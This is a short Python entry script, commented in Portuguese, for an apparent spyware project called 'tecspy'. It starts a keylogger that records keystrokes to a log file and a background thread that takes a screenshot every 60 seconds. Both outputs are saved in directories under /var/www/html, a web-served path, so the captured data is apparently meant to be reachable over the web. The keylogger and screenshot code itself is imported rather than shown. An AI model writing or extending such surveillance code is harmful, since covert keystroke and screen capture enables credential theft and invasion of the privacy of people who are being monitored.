import time
from tecspy.keylogger import KeyLogger
from tecspy.logger import Logger
from tecspy.screenshot import ScreenshotCapturer
from tecspy.config import LOG_FILE_PATH
from tecspy.utils import create_log_directory

# Defina o diretório de logs e screenshots
create_log_directory("/var/www/html/projects/TecTecKey/logs")
screenshot_dir = "/var/www/html/projects/TecTecKey/screenshots"
create_log_directory(screenshot_dir)

# Inicializa o logger
logger = Logger(LOG_FILE_PATH)

# Inicializa o capturador de screenshots
screenshot_capturer = ScreenshotCapturer(screenshot_dir)

# Inicializa o keylogger
keylogger = KeyLogger(log_callback=logger.log_key)

def periodic_screenshot_capture():
    """Captura screenshots periodicamente em um intervalo definido."""
    while True:
        time.sleep(60)  # Captura a cada 60 segundos
        screenshot_capturer.capture()

# Inicia o keylogger e a captura periódica de tela
if __name__ == "__main__":
    import threading
    # Roda a captura de tela em uma thread separada para não bloquear o keylogger
    screenshot_thread = threading.Thread(target=periodic_screenshot_capture)
    screenshot_thread.daemon = True  # Termina junto com o processo principal
    screenshot_thread.start()

    # Inicia o keylogger
    keylogger.start()
